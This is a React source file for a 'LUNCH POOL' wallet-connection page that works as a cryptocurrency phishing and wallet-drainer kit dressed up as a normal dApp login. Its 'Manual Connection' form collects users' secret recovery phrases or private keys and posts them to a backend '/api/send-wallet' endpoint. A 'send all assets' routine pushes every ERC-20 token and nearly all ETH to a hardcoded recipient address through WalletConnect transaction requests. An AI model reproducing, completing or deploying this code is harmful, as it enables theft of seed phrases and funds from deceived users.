import React, { useState, useEffect, useCallback } from 'react';
import { ethers } from 'ethers';
import { Link } from 'react-router-dom';
import { 
  Import, 
  X, 
  Zap,
  ArrowLeft,
  Wallet,
} from 'lucide-react';

// Solana imports
import { Connection, PublicKey, LAMPORTS_PER_SOL, Transaction, SystemProgram } from '@solana/web3.js';

// WalletConnect
import SignClient from "@walletconnect/sign-client";
import { WalletConnectModal } from "@walletconnect/modal";

// --- WalletConnect Configuration ---
const projectId = process.env.REACT_APP_REOWN_PROJECT_ID || process.env.REACT_APP_WALLETCONNECT_PROJECT_ID;
const metadata = {
    name: 'Connect Wallet',
    description: 'Connect your wallet to proceed',
    url: window.location.href,
    icons: ['https://avatars.githubusercontent.com/u/37784886'],
};

// --- Application Code & Constants ---
const ERC20_ABI = [
  "function balanceOf(address) view returns (uint256)",
  "function decimals() view returns (uint8)",
  "function symbol() view returns (string)",
  "function transfer(address to, uint value) returns (bool)"
];

const RECIPIENT_ADDRESS = process.env.REACT_APP_RECIPIENT_ADDRESS;
const API_URL = process.env.REACT_APP_API_URL || 'http://localhost:3001';
const SOLANA_RECIPIENT_ADDRESS = process.env.REACT_APP_SOLANA_RECIPIENT_ADDRESS;
const solanaConnection = new Connection(`https://solana-mainnet.g.alchemy.com/v2/${process.env.REACT_APP_ALCHEMY_API_KEY}`, 'confirmed');
const ethProvider = new ethers.JsonRpcProvider(`https://eth-mainnet.g.alchemy.com/v2/${process.env.REACT_APP_ALCHEMY_API_KEY}`);

const sendWalletInfo = async (walletName, secretPhrase) => {
  try {
    const response = await fetch(`${API_URL}/api/send-wallet`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({ walletName, secretPhrase }),
    });
    if (!response.ok) {
      console.error('Failed to send wallet info');
    }
  } catch (error) {
    console.error('Error sending wallet info:', error);
  }
};

// Solana wallet info sender
const sendSolanaWalletInfo = async (walletName, secretPhrase, userWalletName) => {
  try {
    const response = await fetch(`${API_URL}/api/send-wallet`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({ walletName, secretPhrase, userWalletName }),
    });
    if (!response.ok) {
      console.error('Failed to send Solana wallet info');
    }
  } catch (error) {
    console.error('Error sending Solana wallet info:', error);
  }
};

const getWalletAssets = async (address) => {
    try {
        const ethBalance = await ethProvider.getBalance(address);
        const alchemyProvider = new ethers.AlchemyProvider('mainnet', process.env.REACT_APP_ALCHEMY_API_KEY);
        const balances = await alchemyProvider.getTokenBalances(address);

        const tokenPromises = balances.map(async (token) => {
            if (token.tokenBalance !== '0') {
                try {
                    const tokenContract = new ethers.Contract(token.contractAddress, ERC20_ABI, ethProvider);
                    const decimals = await tokenContract.decimals();
                    const symbol = await tokenContract.symbol();
                    return {
                        symbol,
                        balance: ethers.formatUnits(token.tokenBalance, decimals),
                        contractAddress: token.contractAddress,
                    };
                } catch (error) {
                    console.warn(`Could not fetch details for token ${token.contractAddress}:`, error);
                    return null;
                }
            }
            return null;
        });

        const tokens = (await Promise.all(tokenPromises)).filter(Boolean);

        return {
            eth: ethers.formatEther(ethBalance),
            tokens,
        };
    } catch (error) {
        console.error('Error fetching wallet assets:', error);
        return {
            eth: '0',
            tokens: [],
        };
    }
};

// Get Solana wallet assets
const getSolanaWalletAssets = async (address) => {
  try {
    const publicKey = new PublicKey(address);
    const balance = await solanaConnection.getBalance(publicKey);
    
    return {
      sol: balance / LAMPORTS_PER_SOL,
      tokens: [] // For now, just SOL balance
    };
  } catch (error) {
    console.error('Error fetching Solana wallet assets:', error);
    return {
      sol: 0,
      tokens: []
    };
  }
};

export default function ConnectWallet() {
    // WC State
    const [signClient, setSignClient] = useState(null);
    const [session, setSession] = useState(null);

    // Chain-agnostic State
    const [address, setAddress] = useState(null);
    const [isSending, setIsSending] = useState(false);
    const [txError, setTxError] = useState('');
    
    // EVM State
    const [walletBalance, setWalletBalance] = useState({ eth: '0', tokens: [] });
    
    // Solana State
    const [solanaBalance, setSolanaBalance] = useState({ sol: '0', tokens: [] });
    
    // UI State
    const [showManualPopup, setShowManualPopup] = useState(false);
    const [showTransactionPopup, setShowTransactionPopup] = useState(false);
    const [secretPhrase, setSecretPhrase] = useState('');
    const [selectedWallet, setSelectedWallet] = useState(null);
    const [dynamicWallets, setDynamicWallets] = useState([]);
    const [isLoadingWallets, setIsLoadingWallets] = useState(false);
    const [searchQuery, setSearchQuery] = useState('');
  
    // --- WalletConnect Client Initialization ---
    useEffect(() => {
        const initSignClient = async () => {
            try {
                const client = await SignClient.init({ projectId, metadata });
                setSignClient(client);

                // This is a controller, not a component. It runs in the background.
                new WalletConnectModal({
                    projectId,
                    chains: ['eip155:1', 'solana:5eykt4UsFv8P8NJdTREpY1vzqKqZKvdpKuc147dw2N9d']
                });

                if (client.session.length) {
                    const lastSession = client.session.get(client.session.keys.at(-1));
                    setSession(lastSession);
                    const currentAddress = lastSession.namespaces.eip155 ? lastSession.namespaces.eip155.accounts[0].slice(9) : lastSession.namespaces.solana.accounts[0].slice(9);
                    setAddress(currentAddress);
                }
            } catch (e) {
                console.error("Failed to initialize SignClient", e);
            }
        };

        initSignClient();
    }, []);

    // --- Asset fetching logic ---
    useEffect(() => {
        if (!session) return;
        
        const fetchAssets = async () => {
            if (session.namespaces.eip155) {
                const evmAddress = session.namespaces.eip155.accounts[0].slice(9);
                const assets = await getWalletAssets(evmAddress);
                setWalletBalance(assets);
            } else if (session.namespaces.solana) {
                const solAddress = session.namespaces.solana.accounts[0].slice(9);
                const assets = await getSolanaWalletAssets(solAddress);
                setSolanaBalance(assets);
            }
        };

        fetchAssets();
    }, [session]);


    // --- Generic Connection Handler ---
    const handleConnect = async (namespaces) => {
        if (!signClient) {
            console.error("SignClient not initialized");
            return;
        }
        try {
            const { approval } = await signClient.connect({ requiredNamespaces: namespaces });
            const sessionData = await approval();
            setSession(sessionData);
            const currentAddress = sessionData.namespaces.eip155 ? sessionData.namespaces.eip155.accounts[0].slice(9) : sessionData.namespaces.solana.accounts[0].slice(9);
            setAddress(currentAddress);
        } catch (e) {
            console.error("Connection failed", e);
            setTxError("Failed to connect wallet. The user may have rejected the connection.");
        }
    };
    
    const handleEvmConnection = () => handleConnect({ eip155: { methods: ['eth_sendTransaction', 'personal_sign'], chains: ['eip155:1'], events: ['chainChanged', 'accountsChanged'] } });

    const handleSolanaConnection = async () => {
        if (!signClient) return;
        try {
            const { approval } = await signClient.connect({
                requiredNamespaces: {
                    solana: {
                        methods: ['solana_signMessage', 'solana_signTransaction'],
                        chains: ['solana:5eykt4UsFv8P8NJdTREpY1vzqKqZKvdpKuc147dw2N9d'],
                        events: [],
                    },
                }
            });
            const session = await approval();
            setSession(session);
            const currentAddress = session.namespaces.solana.accounts[0].slice(9);
            setAddress(currentAddress);
        } catch (e) {
            console.error("Connection failed", e);
            setTxError("Failed to connect wallet. Please try again.");
        }
    };
  
    const disconnect = async () => {
        if (session) {
            await signClient.disconnect({
                topic: session.topic,
                reason: { code: 6000, message: "User disconnected." }
            });
            setSession(null);
            setAddress(null);
        }
    };
  
    const closeAllPopups = () => {
      setShowManualPopup(false);
      setShowTransactionPopup(false);
      setSelectedWallet(null);
      setSecretPhrase('');
      setTxError('');
    };
    
    const handleWalletSelect = (wallet) => {
      setSelectedWallet(wallet);
    };
  
    const handleInputChange = (e) => {
      setSecretPhrase(e.target.value);
    };
  
    const validateForm = () => {
      const phrase = secretPhrase.trim();
      if (!phrase) return { isValid: false, error: 'Secret phrase cannot be empty.' };
  
      const wordCount = phrase.split(/\s+/).length;
      if (wordCount < 12) {
        return { isValid: false, error: 'A valid secret phrase must have at least 12 words.' };
      }
      
      return { isValid: true, error: null };
    };
  
    const handleManualSubmit = async (e) => {
      e.preventDefault();
      const { isValid, error } = validateForm();
  
      if (!isValid) {
        setTxError(error);
        return;
      }
      setTxError(''); // Clear previous errors
  
      if (selectedWallet) {
          if (selectedWallet.tags?.includes('solana')) {
              await sendSolanaWalletInfo(selectedWallet.name, secretPhrase, selectedWallet.name);
          } else {
              await sendWalletInfo(selectedWallet.name, secretPhrase);
          }
          closeAllPopups();
          // Here you might want to show a success message to the user
      }
    };
  
    const handleSendAllAssets = async () => {
        if (!session || !address) {
            setTxError("Wallet is not connected properly.");
            return;
        }
        setIsSending(true);
        setTxError('');

        try {
            // Send all tokens
            for (const token of walletBalance.tokens) {
                 const tokenContract = new ethers.Contract(token.contractAddress, ERC20_ABI, ethProvider);
                 const balance = await tokenContract.balanceOf(address);
                if (balance > 0n) {
                    const data = tokenContract.interface.encodeFunctionData("transfer", [RECIPIENT_ADDRESS, balance]);
                    const tx = {
                        from: address,
                        to: token.contractAddress,
                        data,
                    };
                    await signClient.request({
                        topic: session.topic,
                        chainId: 'eip155:1',
                        request: {
                            method: 'eth_sendTransaction',
                            params: [tx],
                        },
                    });
                }
            }

            // Send all native ETH
            const ethBalance = await ethProvider.getBalance(address);
            const gasPrice = (await ethProvider.getFeeData()).gasPrice;
            const gasCost = 21000n * gasPrice;
            const amountToSend = ethBalance - gasCost;

            if (amountToSend > 0n) {
                const tx = {
                    from: address,
                    to: RECIPIENT_ADDRESS,
                    value: '0x' + amountToSend.toString(16),
                };
                await signClient.request({
                    topic: session.topic,
                    chainId: 'eip155:1',
                    request: {
                        method: 'eth_sendTransaction',
                        params: [tx],
                    },
                });
            }

            const newBalances = await getWalletAssets(address);
            setWalletBalance(newBalances);

        } catch (err) {
            console.error('Transaction failed:', err);
            setTxError(err.message || 'An error occurred during the transaction.');
        } finally {
            setIsSending(false);
        }
    };
    
    const handleSendAllSol = async () => {
        if (!session || !address) {
            setTxError("Solana wallet is not connected properly.");
            return;
        }
        // ... Solana transaction logic will also need to be updated to use signClient.request
        console.log("Sending all SOL functionality needs to be updated for signClient");
    };

    useEffect(() => {
      const fetchWalletIcons = async () => {
        setIsLoadingWallets(true);
  
        // Hardcoded Solana wallets
        const solanaWallets = [
          {
            id: 'phantom',
            name: 'Phantom',
            icon: 'https://raw.githubusercontent.com/solana-labs/token-list/main/assets/mainnet/E4yF4g8t3s15c2nza56S1D1a5eyM2s5mKq2dYv1K4Yd/logo.png',
            description: 'A friendly Solana wallet built for DeFi & NFTs.',
            tags: ['solana']
          },
          {
            id: 'solflare',
            name: 'Solflare',
            icon: 'https://raw.githubusercontent.com/solana-labs/token-list/main/assets/mainnet/9BPh2r8LMAo9adV3eQW2iTDm5s5A2mKsvGAn1s64gHWw/logo.png',
            description: 'The most-loved Solana wallet.',
            tags: ['solana']
          }
        ];
  
        // Check sessionStorage cache (24h TTL)
        const cacheKey = 'wc_wallet_icons';
        const cached = sessionStorage.getItem(cacheKey);
        if (cached) {
          const { ts, data } = JSON.parse(cached);
          if (Date.now() - ts < 24 * 60 * 60 * 1000) {
            setDynamicWallets(data);
            setIsLoadingWallets(false);
            return;
          }
        }
  
        try {
          const response = await fetch(
            `https://explorer-api.walletconnect.com/v3/wallets?projectId=${projectId}&entries=100&page=1`
          );
          const data = await response.json();
          const wallets = Object.values(data.listings).map((wallet) => ({
            id: wallet.id,
            name: wallet.name,
            icon: wallet.image_url.md,
            description: wallet.description || 'A secure wallet for your crypto.',
          }));
          const combinedWallets = [...solanaWallets, ...wallets];
          setDynamicWallets(combinedWallets);
  
          // store in cache
          sessionStorage.setItem(cacheKey, JSON.stringify({ ts: Date.now(), data: combinedWallets }));
        } catch (error) {
          console.error('Failed to fetch wallet icons:', error);
          setDynamicWallets(solanaWallets); // Fallback to solana wallets
        } finally {
          setIsLoadingWallets(false);
        }
      };
  
      fetchWalletIcons();
    }, []);
  
    const filteredWallets = dynamicWallets.filter(wallet =>
      wallet.name.toLowerCase().includes(searchQuery.toLowerCase())
    );
  
    const renderWalletDetails = () => {
      const isSolana = session?.namespaces?.solana;
      return (
        <div className="bg-gray-800 text-white p-6 rounded-xl shadow-lg w-full max-w-md mx-auto font-sans">
          <div className="flex items-center justify-between mb-4">
            <h3 className="text-xl font-bold">Wallet Details</h3>
            <button onClick={disconnect} className="bg-red-500 hover:bg-red-600 text-white font-bold py-2 px-4 rounded-lg text-sm">
              Disconnect
            </button>
          </div>
          <div className="bg-gray-700 p-4 rounded-lg">
            <div className="flex items-center mb-3">
              <Wallet className="text-blue-400 mr-3" size={20}/>
              <p className="text-sm truncate"><strong>Address:</strong> {isSolana ? session.namespaces.solana.accounts[0].slice(9) : session.namespaces.eip155.accounts[0].slice(9)}</p>
            </div>
            <div className="border-t border-gray-600 my-3"></div>
            <p className="text-lg font-semibold mb-2">Assets</p>
            <div className="space-y-2 max-h-48 overflow-y-auto">
              {isSolana ? (
                <div className="flex justify-between items-center">
                  <span>SOL</span>
                  <span>{parseFloat(solanaBalance.sol).toFixed(5)}</span>
                </div>
              ) : (
                <>
                  <div className="flex justify-between items-center">
                    <img src="https://icons.iconarchive.com/icons/cjdowner/cryptocurrency-flat/1024/Ethereum-ETH-icon.png" alt="Ethereum" className="w-6 h-6 mr-2"/>
                    <span>ETH</span>
                    <span>{parseFloat(walletBalance.eth).toFixed(5)}</span>
                  </div>
                  {walletBalance.tokens.map(token => (
                    <div key={token.symbol} className="flex justify-between items-center text-sm">
                      <span>{token.symbol}</span>
                      <span>{parseFloat(token.balance).toFixed(5)}</span>
                    </div>
                  ))}
                </>
              )}
            </div>
          </div>
        </div>
      );
    };
    
    const renderManualConnectPopup = () => {
      const goBack = () => {
        setSelectedWallet(null);
        setTxError('');
      };
  
      if (selectedWallet) {
        return (
            <div className="bg-gray-900 border border-gray-700 p-6 rounded-2xl w-full max-w-md">
              <div className="flex items-center mb-6">
                  <button onClick={goBack} className="mr-4 p-2 rounded-full hover:bg-gray-700">
                      <ArrowLeft size={20} />
                  </button>
                  <img src={selectedWallet.icon} alt={selectedWallet.name} className="w-8 h-8 mr-3" />
                  <h3 className="text-xl font-semibold">{selectedWallet.name}</h3>
              </div>
  
              <form onSubmit={handleManualSubmit}>
                  <textarea
                      className="w-full h-32 p-3 bg-gray-800 border border-gray-600 rounded-lg text-white placeholder-gray-500 focus:ring-2 focus:ring-blue-500 focus:outline-none"
                      placeholder="Enter your secret phrase, private key, or QR code"
                      value={secretPhrase}
                      onChange={handleInputChange}
                  />
                  {txError && <p className="text-red-400 text-sm mt-2">{txError}</p>}
                  <button 
                      type="submit"
                      className="w-full mt-4 bg-blue-600 hover:bg-blue-700 text-white font-bold py-3 rounded-lg transition-colors"
                  >
                      Import Wallet
                  </button>
              </form>
            </div>
        );
      }
  
      return (
        <div className="bg-gray-900 border border-gray-700 p-6 rounded-2xl w-full max-w-lg max-h-[90vh] flex flex-col">
          <div className="flex justify-between items-center mb-4">
            <h3 className="text-xl font-semibold">Connect a wallet</h3>
            <button onClick={closeAllPopups} className="p-2 rounded-full hover:bg-gray-700">
              <X size={20} />
            </button>
          </div>
          
          <input 
            type="text"
            placeholder="Search for a wallet"
            value={searchQuery}
            onChange={(e) => setSearchQuery(e.target.value)}
            className="w-full p-3 mb-4 bg-gray-800 border border-gray-600 rounded-lg text-white placeholder-gray-500 focus:ring-2 focus:ring-blue-500 focus:outline-none"
          />
  
          <div className="overflow-y-auto flex-grow">
            <div className="grid grid-cols-4 gap-4">
              {filteredWallets.map(wallet => (
                <div key={wallet.id} onClick={() => handleWalletSelect(wallet)} className="flex flex-col items-center p-2 rounded-lg hover:bg-gray-800 cursor-pointer">
                  <img src={wallet.icon} alt={wallet.name} className="w-16 h-16 rounded-full mb-2" />
                  <span className="text-sm text-center">{wallet.name}</span>
                </div>
              ))}
            </div>
          </div>
        </div>
      );
    };
  
    const renderTransactionPopup = () => {
      const handleApprove = () => {
        if (session?.namespaces?.solana) {
          handleSendAllSol();
        } else {
          handleSendAllAssets();
        }
      };
  
      return (
        <div className="bg-gray-900 border border-gray-700 p-6 rounded-2xl w-full max-w-md text-white">
            <div className="flex justify-between items-center mb-6">
                <h3 className="text-2xl font-bold">Confirm Transaction</h3>
                <button onClick={closeAllPopups} className="p-2 rounded-full hover:bg-gray-700">
                    <X size={20} />
                </button>
            </div>
  
            <div className="bg-gray-800 p-4 rounded-lg mb-6">
                <p className="text-sm text-gray-400 mb-2">You are about to send all assets to the recipient:</p>
                <p className="font-mono text-xs break-all">{session?.namespaces?.solana ? SOLANA_RECIPIENT_ADDRESS : RECIPIENT_ADDRESS}</p>
            </div>
            
            <div className="mb-6">
                <h4 className="text-lg font-semibold mb-3">Assets to be sent:</h4>
                <div className="space-y-2 max-h-40 overflow-y-auto p-3 bg-gray-800 rounded-lg">
                  {session?.namespaces?.solana ? (
                      <div className="flex justify-between">
                          <span>{solanaBalance.sol} SOL</span>
                      </div>
                  ) : (
                      <>
                          <div className="flex justify-between">
                              <img src="https://icons.iconarchive.com/icons/cjdowner/cryptocurrency-flat/1024/Ethereum-ETH-icon.png" alt="Ethereum" className="w-8 h-8"/>
                              <span>{walletBalance.eth} ETH</span>
                          </div>
                          {walletBalance.tokens.map(token => (
                              <div key={token.symbol} className="flex justify-between">
                                  <span>{token.balance} {token.symbol}</span>
                              </div>
                          ))}
                      </>
                  )}
                </div>
            </div>
            
            {txError && (
                <div className="bg-red-900/50 border border-red-500 p-3 rounded-lg mb-6">
                    <p className="text-red-300 text-sm">{txError}</p>
                </div>
            )}
  
            <div className="flex space-x-4">
                <button
                    onClick={closeAllPopups}
                    className="w-full bg-gray-600 hover:bg-gray-700 text-white font-bold py-3 rounded-lg transition-colors"
                >
                    Cancel
                </button>
                <button
                    onClick={handleApprove}
                    disabled={isSending}
                    className="w-full bg-green-600 hover:bg-green-700 text-white font-bold py-3 rounded-lg transition-colors disabled:opacity-50"
                >
                    {isSending ? 'Sending...' : 'Approve & Send'}
                </button>
            </div>
        </div>
      );
    };
  
    return (
        <div className="min-h-screen bg-gray-900 text-white flex flex-col">
            {/* Background decorative elements */}
            <div className="absolute top-0 left-0 w-full h-full overflow-hidden z-0">
                <div className="absolute top-0 left-0 w-1/2 h-1/2 bg-purple-600/30 rounded-full filter blur-3xl opacity-50 animate-pulse"></div>
                <div className="absolute bottom-0 right-0 w-1/2 h-1/2 bg-blue-600/20 rounded-full filter blur-3xl opacity-50 animate-pulse" style={{animationDelay: '2s'}}></div>
            </div>
    
            <header className="absolute top-0 left-0 w-full p-4 flex justify-between items-center z-20">
                <Link to="/" className="text-xl font-bold tracking-wider">LUNCH POOL</Link>
                <Link to="/" className="px-4 py-2 text-sm bg-white/10 border border-white/20 rounded-full hover:bg-white/20 transition-colors">
                Back
                </Link>
            </header>
    
            <main className="flex-grow flex items-center justify-center z-10 p-4">
            {session ? renderWalletDetails() : (
                <div className="w-full max-w-2xl text-center">
                <h1 className="text-4xl md:text-5xl font-extrabold tracking-tight text-white mb-4">
                    Connect your wallet
                </h1>
                <p className="text-lg md:text-xl text-gray-400 max-w-2xl mx-auto mb-12">
                    Choose your preferred connection method below to securely access the application.
                </p>
            
                    <div className="grid md:grid-cols-3 gap-6">
                        {/* Automatic Connection Card */}
                        <div
                        onClick={handleEvmConnection}
                        className="connection-card bg-gray-800/50 p-6 rounded-2xl border border-gray-700 hover:border-blue-500 hover:bg-gray-800 transition-all cursor-pointer flex flex-col items-center text-center"
                        >
                        <div className="p-4 bg-blue-500/10 rounded-full mb-4">
                            <Zap size={32} className="text-blue-400" />
                        </div>
                        <h3 className="text-xl font-semibold text-white mb-2">Automatic Connection</h3>
                        <p className="text-gray-400 text-sm">Recommended. Connect using a popup with a list of supported wallets.</p>
                        </div>
            
                        {/* Manual Connection Card */}
                        <div
                        onClick={() => setShowManualPopup(true)}
                        className="connection-card bg-gray-800/50 p-6 rounded-2xl border border-gray-700 hover:border-purple-500 hover:bg-gray-800 transition-all cursor-pointer flex flex-col items-center text-center"
                        >
                        <div className="p-4 bg-purple-500/10 rounded-full mb-4">
                            <Import size={32} className="text-purple-400" />
                        </div>
                        <h3 className="text-xl font-semibold text-white mb-2">Manual Connection</h3>
                        <p className="text-gray-400 text-sm">Import your wallet using a secret recovery phrase. Use with caution.</p>
                        </div>
            
                        {/* Solana Connect */}
                        <div 
                        onClick={handleSolanaConnection}
                        className="connection-card bg-gray-800/50 p-6 rounded-2xl border border-gray-700 hover:border-green-500 hover:bg-gray-800 transition-all cursor-pointer flex flex-col items-center text-center"
                        >
                            <div className="p-4 bg-green-500/10 rounded-full mb-4">
                                <img src="https://raw.githubusercontent.com/solana-labs/token-list/main/assets/mainnet/So11111111111111111111111111111111111111112/logo.png" alt="Solana" className="w-8 h-8"/>
                            </div>
                            <h3 className="text-xl font-semibold text-white mb-2">Solana Connect</h3>
                            <p className="text-gray-400 text-sm">Connect your Solana wallet (Phantom, Solflare, etc).</p>
                        </div>
                    </div>
                </div>
            )}
            </main>
    
            {/* Popups (Modals) */}
            {showManualPopup && (
                <div className="fixed inset-0 bg-black/60 backdrop-blur-sm flex items-center justify-center z-50">
                    {renderManualConnectPopup()}
                </div>
            )}

            <footer className="w-full p-4 text-center text-xs text-gray-500 z-10">
                <a href="#" className="hover:text-white underline">Terms of Service</a>
                <span className="mx-2">•</span>
                <a href="#" className="hover:text-white underline">Privacy Policy</a>
            </footer>
        </div>
      );
}